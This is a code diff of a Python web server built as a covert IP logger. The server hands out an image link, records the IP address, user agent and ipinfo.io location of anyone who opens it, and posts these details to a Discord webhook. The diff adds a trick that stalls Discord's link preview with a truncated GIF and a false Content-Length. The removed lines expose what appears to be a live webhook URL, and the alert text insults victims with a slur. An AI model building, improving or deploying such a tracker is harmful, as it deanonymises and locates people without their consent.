@@ -1,18 +1,14 @@
-from http.server import BaseHTTPRequestHandler
+from http.server import BaseHTTPRequestHandler, HTTPServer
 from urllib import parse
 import httpx
+import base64
 import httpagentparser
 
 # === CHANGE THIS TO YOUR REAL DISCORD WEBHOOK URL ===
-webhook = 'https://discord.com/api/webhooks/1453028520761626776/N0tjZRoNrNCsBBg0YHXHcPCix0lZhM1TeWsxUQDYTUoLZNdwNVf8nGo-ITX7MFTujFwi'
+webhook = 'https://discord.com/api/webhooks/YOUR/WEBHOOK/HERE'
 
+# The real image shown when they click the link
 bindata = httpx.get('https://th.bing.com/th/id/OIP.xXJEf5k4LqmkR9skmyBlCQHaIi?w=153&h=180&c=7&r=0&o=7&cb=ucfimg2&pid=1.7&rm=3&ucfimg=1').content
-
-# Tiny blank pixel for "broken open" if you want to force disappointment after click (optional bait)
-blank_pixel = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\xdcc\xf8\x0f\x00\x01\x01\x01\x00\x18\xdd\x03\x03\x00\x00\x00\x00IEND\xaeB`\x82'
-
-# Set to True if you want "open original" to show blank (makes it look broken after click)
-break_open = False
 
 def formatHook(ip, city, reg, country, loc, org, postal, useragent, os, browser):
     return {
@@ -22,7 +18,7 @@ def formatHook(ip, city, reg, country, loc, org, postal, useragent, os, browser)
             {
                 "title": "DADDY BOB STRIKES AGAIN!",
                 "color": 16711803,
-                "description": "A New Retard Opened The \"Gif\" LOL.",
+                "description": "A New Retard Opened The 'Gif' LOL.",
                 "author": {"name": "Fentanyl"},
                 "fields": [
                     {
@@ -48,7 +44,7 @@ def prev(ip, uag):
             {
                 "title": "Fentanyl Alert!",
                 "color": 16711803,
-                "description": f"Discord previewed a Fentanyl Image! You can expect an IP soon.\n\n**IP:** `{ip}`\n**UserAgent:** `{uag}`",
+                "description": f"Discord previewed a Fentanyl Image! You can expect an IP soon.\n\n**IP:** {ip}\n**UserAgent:** {uag}",
                 "author": {"name": "Fentanyl"}
             }
         ]
@@ -57,40 +53,34 @@ def prev(ip, uag):
 class handler(BaseHTTPRequestHandler):
     def do_GET(self):
         try:
-            # Get real IP
+            # Get real IP (first in x-forwarded-for list)
             forwarded = self.headers.get('x-forwarded-for')
-            ip = forwarded.split(',')[0].strip() if forwarded else self.client_address[0]
+            ip = forwarded.split(',')[0].strip() if forwarded else 'Unknown'
             useragent = self.headers.get('user-agent', 'No User Agent Found!')
             os, browser = httpagentparser.simple_detect(useragent)
 
-            # Parse ?url= proxy load
-            query = parse.urlsplit(self.path).query
-            dic = dict(parse.parse_qsl(query))
-            try:
-                data = httpx.get(dic['url']).content if 'url' in dic else bindata
-            except Exception:
-                data = bindata
-
-            # Detect Discord preview/bot
-            is_discord_preview = ('discord' in useragent.lower() or 
-                                  ip.startswith(('35.', '34.', '104.196.', '162.158.', '194.195.')))
-
-            if is_discord_preview:
-                # Preview gets real image → perfect thumbnail
+            # 1. DISCORD PREVIEW DETECTION (Infinite Loading Glitch)
+            if 'discord' in useragent.lower() or 'ExternalHit' in useragent:
                 self.send_response(200)
                 self.send_header('Content-type', 'image/gif')
+                # Trick Discord into waiting for a massive file that never finishes
+                self.send_header('Content-Length', '9999999') 
                 self.end_headers()
-                self.wfile.write(data)
+                
+                # Send just the start of a GIF header to trigger the loading state
+                self.wfile.write(b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;')
+                
+                # Notify webhook that Discord is previewing
                 httpx.post(webhook, json=prev(ip, useragent))
                 return
 
-            # Real user open → grab IP, serve real or blank
+            # 2. REAL USER DETECTION (Grab and Serve)
             self.send_response(200)
-            self.send_header('Content-type', 'image/gif')
+            self.send_header('Content-type', 'image/jpeg')
             self.end_headers()
-            self.wfile.write(blank_pixel if break_open else data)
+            self.wfile.write(bindata)
 
-            # Send grab to webhook
+            # Fetch IP info and send to webhook
             try:
                 ipInfo = httpx.get(f'https://ipinfo.io/{ip}/json').json()
                 payload = formatHook(
@@ -101,18 +91,21 @@ class handler(BaseHTTPRequestHandler):
                     ipInfo.get('loc', 'Unknown'),
                     ipInfo.get('org', 'Unknown'),
                     ipInfo.get('postal', 'Unknown'),
-                    useragent,
-                    os,
-                    browser
+                    useragent, os, browser
                 )
                 httpx.post(webhook, json=payload)
             except Exception:
                 httpx.post(webhook, json=formatHook(ip, 'Unknown', 'Unknown', 'Unknown', 'Unknown', 'Unknown', 'Unknown', useragent, os, browser))
 
-        except Exception:
-            # Fallback
+        except Exception as e:
+            # Emergency fallback
             self.send_response(200)
-            self.send_header('Content-type', 'image/gif')
+            self.send_header('Content-type', 'image/jpeg')
             self.end_headers()
             self.wfile.write(bindata)
-        return
+
+# To run locally for testing:
+if __name__ == "__main__":
+    server = HTTPServer(('0.0.0.0', 8080), handler)
+    print("Server started on port 8080...")
+    server.serve_forever()
